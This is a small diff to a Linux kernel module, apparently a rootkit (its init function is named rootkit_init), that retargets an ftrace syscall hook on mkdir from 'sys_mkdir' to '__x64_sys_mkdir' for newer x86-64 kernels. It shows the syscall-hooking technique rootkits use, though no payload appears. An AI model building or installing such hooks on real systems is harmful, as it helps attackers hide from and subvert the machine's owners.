@@ -43,7 +43,7 @@ asmlinkage int hook_mkdir(const char __user *pathname,umode_t mode)
 #endif
 
 static struct ftrace_hook hooks[] = {
-	HOOK("sys_mkdir", hook_mkdir, &orig_mkdir),
+	HOOK("__x64_sys_mkdir", hook_mkdir, &orig_mkdir),
 };
 static int __init rootkit_init(void)
 {
